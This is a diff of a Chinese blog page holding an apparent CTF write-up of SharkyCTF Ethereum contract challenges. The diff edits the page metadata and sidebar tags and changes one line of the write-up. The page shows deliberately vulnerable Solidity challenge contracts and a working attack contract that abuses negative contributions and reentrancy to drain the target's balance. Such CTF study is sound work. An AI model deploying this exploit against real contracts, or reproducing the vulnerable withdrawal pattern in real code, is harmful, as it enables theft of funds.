@@ -265,9 +265,15 @@ height:45vh;
             <div class="post-intros">
                 <!-- 文章页标签  -->
                 
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "合约">合约</a>
+    
+</div>
+                
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">912</span>阅读时长: <span class="post-count reading-time">4 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">909</span>阅读时长: <span class="post-count reading-time">4 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -394,7 +400,7 @@ height:45vh;
         <blockquote>
 <p>近日空闲下来，尝试复现下ctf合约部分的一些题解，全当复习下以前所学知识</p>
 </blockquote>
-<h1 id="Ethereum"><a href="#Ethereum" class="headerlink" title="Ethereum"></a>Ethereum</h1><p>截止目前：<a href="ethereum.sharkyctf.xy">题目链接</a></p>
+<h1 id="Ethereum"><a href="#Ethereum" class="headerlink" title="Ethereum"></a>Ethereum</h1><p>截止目前：<a href="http://ethereum.sharkyctf.xyz" target="_blank" rel="noopener">题目链接</a></p>
 <h2 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity = 0.4.25;</span><br><span class="line"></span><br><span class="line">contract Warmup &#123;</span><br><span class="line">    bool public locked;</span><br><span class="line">    </span><br><span class="line">    constructor() public payable &#123;</span><br><span class="line">        locked = true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function unlock() public payable &#123;</span><br><span class="line">        require(msg.value == 0.005 ether);</span><br><span class="line">        locked = false;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function withdraw() public payable &#123;</span><br><span class="line">        require(!locked);</span><br><span class="line">        msg.sender.call.value(address(this).balance)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>题目很简单，只要发送0.005 ether到目的合约就可以得到flag了</p>
 <p><img src="https://i.loli.net/2020/05/11/ZEupHO8sh7feVDT.jpg" alt=""></p>
@@ -416,7 +422,7 @@ height:45vh;
 <p><code>require(contributions[msg.sender] != 0 &amp;&amp; _factor &lt; 10);</code></p>
 <p>结合简单粗暴的将钱包值与输入值相乘，也就是说我们传入2次负值，最后乘成一个超大值来大过合约主。</p>
 <p><code>contributions[msg.sender] *= _factor;</code></p>
-<p>最后还要匿名函数回调下，防止withdrawn变true，（ps：之前还以为不用管</p>
+<p>最后还要匿名函数回调下，一直重入让钱包数归零</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(msg.sender.call.value(someMoney)())&#123;</span><br><span class="line">            money -= someMoney;</span><br><span class="line">        &#125;</span><br><span class="line">withdrawn = true;</span><br></pre></td></tr></table></figure>
 <p>按着上述思路，给出exp，（ps:start的时候注意填ether Value为0.00005，还有速度太感人了。还是自己手动加速gas来得快</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">contract attack &#123;    </span><br><span class="line">    address  attacker;</span><br><span class="line">    address  victim;</span><br><span class="line">    function attack() payable &#123;attacker = msg.sender;&#125;</span><br><span class="line">    function start(address _target)  payable &#123;</span><br><span class="line">        victim = _target;</span><br><span class="line">        victim.call.value(0.00005 ether)(bytes4(keccak256(&quot;gift()&quot;)));</span><br><span class="line">        victim.call(bytes4(keccak256(&quot;contribute(int256)&quot;)), -1000000000000);  </span><br><span class="line">        victim.call(bytes4(keccak256(&quot;contribute(int256)&quot;)), -1000000000000);  </span><br><span class="line">        victim.call(bytes4(keccak256(&quot;claimContract()&quot;)));  </span><br><span class="line">        victim.call(bytes4(keccak256(&quot;takeSomeMoney()&quot;)));  </span><br><span class="line">        &#125;</span><br><span class="line">    function remove()  &#123;</span><br><span class="line">        if (msg.sender == attacker)&#123;</span><br><span class="line">            selfdestruct(attacker); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function () payable &#123;</span><br><span class="line">        if (msg.sender == victim) &#123;</span><br><span class="line">            victim.call(bytes4(keccak256(&quot;takeSomeMoney()&quot;)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -429,13 +435,18 @@ height:45vh;
             <p>原文作者：<a href="http://Vorders.me">Vorder</a>
             <p>原文链接：<a href="http://Vorders.me/2020/05/11/SharkyCTF-合约部分wp/">http://Vorders.me/2020/05/11/SharkyCTF-合约部分wp/</a>
             <p>发表日期：<a href="http://Vorders.me/2020/05/11/SharkyCTF-合约部分wp/">May 11th 2020, 3:05:52 pm</a>
-            <p>更新日期：<a href="http://Vorders.me/2020/05/11/SharkyCTF-合约部分wp/">May 11th 2020, 9:59:13 pm</a>
+            <p>更新日期：<a href="http://Vorders.me/2020/05/11/SharkyCTF-合约部分wp/">May 12th 2020, 10:04:09 am</a>
             <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
     <!-- paginator  -->
     <ul class="post-paginator">
         <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2020/05/18/CVE-2017-7921-海康威视身份认证绕过漏洞/" title= "CVE-2017-7921 海康威视身份认证绕过漏洞">
+                    <div class="nextTitle">CVE-2017-7921 海康威视身份认证绕过漏洞</div>
+                </a>
             
         </li>
         <li class="previous">
@@ -682,10 +693,9 @@ top:45vh;
     
     
     
-    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 10
+        Total : 11
         </div>
         <!-- search  -->
         
@@ -698,6 +708,11 @@ top:45vh;
     
     <div class="archive-year"> 2020 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/18</span><a class="archive-post-title" href= "/2020/05/18/CVE-2017-7921-海康威视身份认证绕过漏洞/" >CVE-2017-7921 海康威视身份认证绕过漏洞</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -772,21 +787,27 @@ top:45vh;
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
+        <span class="sidebar-tag-name" data-tags="CVE-2017-7921"><span class="iconfont-archer">&#xe606;</span>CVE-2017-7921</span>
+    
+        <span class="sidebar-tag-name" data-tags="漏洞利用"><span class="iconfont-archer">&#xe606;</span>漏洞利用</span>
+    
         <span class="sidebar-tag-name" data-tags="vulub"><span class="iconfont-archer">&#xe606;</span>vulub</span>
+    
+        <span class="sidebar-tag-name" data-tags="合约"><span class="iconfont-archer">&#xe606;</span>合约</span>
+    
+        <span class="sidebar-tag-name" data-tags="ELK"><span class="iconfont-archer">&#xe606;</span>ELK</span>
     
         <span class="sidebar-tag-name" data-tags="sem-cms"><span class="iconfont-archer">&#xe606;</span>sem-cms</span>
     
         <span class="sidebar-tag-name" data-tags="漏洞挖掘"><span class="iconfont-archer">&#xe606;</span>漏洞挖掘</span>
     
-        <span class="sidebar-tag-name" data-tags="ELK"><span class="iconfont-archer">&#xe606;</span>ELK</span>
+        <span class="sidebar-tag-name" data-tags="信息搜集"><span class="iconfont-archer">&#xe606;</span>信息搜集</span>
+    
+        <span class="sidebar-tag-name" data-tags="知识积累"><span class="iconfont-archer">&#xe606;</span>知识积累</span>
     
         <span class="sidebar-tag-name" data-tags="主机检测点索引"><span class="iconfont-archer">&#xe606;</span>主机检测点索引</span>
     
         <span class="sidebar-tag-name" data-tags="端口渗透tips"><span class="iconfont-archer">&#xe606;</span>端口渗透tips</span>
-    
-        <span class="sidebar-tag-name" data-tags="信息搜集"><span class="iconfont-archer">&#xe606;</span>信息搜集</span>
-    
-        <span class="sidebar-tag-name" data-tags="知识积累"><span class="iconfont-archer">&#xe606;</span>知识积累</span>
     
         <span class="sidebar-tag-name" data-tags="hw"><span class="iconfont-archer">&#xe606;</span>hw</span>
     
@@ -821,6 +842,8 @@ top:45vh;
         <span class="sidebar-tag-name" data-tags="sqli bypass"><span class="iconfont-archer">&#xe606;</span>sqli bypass</span>
     
         <span class="sidebar-tag-name" data-tags="shellcode bypass"><span class="iconfont-archer">&#xe606;</span>shellcode bypass</span>
+    
+        <span class="sidebar-tag-name" data-tags="configurationFile"><span class="iconfont-archer">&#xe606;</span>configurationFile</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
